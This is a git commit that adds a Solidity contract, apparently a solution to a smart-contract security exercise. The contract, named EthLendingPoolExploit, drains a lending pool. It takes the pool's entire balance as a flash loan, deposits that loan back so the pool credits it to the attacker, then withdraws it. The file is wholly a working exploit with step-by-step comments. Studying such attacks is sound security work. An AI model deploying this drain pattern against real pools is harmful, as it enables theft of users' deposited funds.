96ffde6361feccf7eb3dc88c190e623fdd2816c2
alexursol2 <103754814+alexursol2@users.noreply.github.com>
2024-03-09 19:02:42 +0100

    Update ETH_Flash_Loan.sol

--- Security/ETH_Flash_Loan.sol
+++ Security/ETH_Flash_Loan.sol
@@ -1,1 +1,34 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
 
+interface IEthLendingPool {
+    function balances(address) external view returns (uint256);
+    function deposit() external payable;
+    function withdraw(uint256 _amount) external;
+    function flashLoan(uint256 amount, address target, bytes calldata data)
+        external;
+}
+
+contract EthLendingPoolExploit {
+    IEthLendingPool public pool;
+
+    constructor(address _pool) {
+        pool = IEthLendingPool(_pool);
+    }
+
+    // 4. receive ETH from withdraw
+    receive() external payable {}
+
+    // 2. deposit loan into pool
+    function deposit() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    function pwn() external {
+        uint256 bal = address(pool).balance;
+        // 1. call flash loan
+        pool.flashLoan(bal, address(this), abi.encodeWithSignature("deposit()"));
+        // 3. withdraw
+        pool.withdraw(pool.balances(address(this)));
+    }
+}
